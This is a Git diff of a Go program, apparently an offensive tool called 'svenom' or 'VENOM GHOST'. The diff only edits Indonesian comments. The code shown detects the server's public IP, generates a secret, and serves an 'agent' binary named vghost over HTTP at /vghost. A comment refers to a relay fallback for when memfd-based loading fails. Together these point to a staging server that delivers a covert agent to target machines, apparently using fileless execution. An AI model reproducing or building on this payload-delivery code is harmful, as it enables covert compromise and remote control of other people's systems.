@@ -44,28 +44,26 @@ func main() {
 		return
 	}
 
-	// Deteksi IP Publik
 	publicIP, _ := getPublicIP()
 	serverDomain := *domain
 	if serverDomain == "" {
 		serverDomain = publicIP
 	}
 
-	// Generate Secret
 	secretBytes := make([]byte, 16)
 	rand.Read(secretBytes)
 	secret := hex.EncodeToString(secretBytes)
 
 	absPath, _ := filepath.Abs(".")
 
-	// Baca file agen dari disk (harus ada di samping svenom/agentbin/vghost)
+	// Baca file agent dari disk (harus ada di cmd/svenom/agentbin/vghost)
 	agentPath := filepath.Join(absPath, "cmd/svenom/agentbin/vghost")
 	agentBin, err := os.ReadFile(agentPath)
 	if err != nil {
 		log.Fatalf("Agent binary not found at %s: %v", agentPath, err)
 	}
 
-	// Spawn HTTP server untuk agen binary (di background)
+	// Spawn HTTP server untuk agent binary (background)
 	go func() {
 		http.HandleFunc("/vghost", func(w http.ResponseWriter, r *http.Request) {
 			w.Header().Set("Content-Type", "application/octet-stream")
@@ -75,7 +73,7 @@ func main() {
 		http.ListenAndServe(fmt.Sprintf(":%s", *httpPort), nil)
 	}()
 
-	// Output instalasi
+	// Output instalasi bersih
 	fmt.Println(banner)
 	fmt.Println("(VENOM GHOST) ")
 	fmt.Printf("IP Public Address Server : %s\n", publicIP)
@@ -109,7 +107,6 @@ func getPublicIP() (string, error) {
 	return string(body), nil
 }
 
-// Fallback relay sederhana (jika memfd gagal, jarang)
 func startRelayFallback(addr string) {
 	ln, err := net.Listen("tcp", addr)
 	if err != nil {
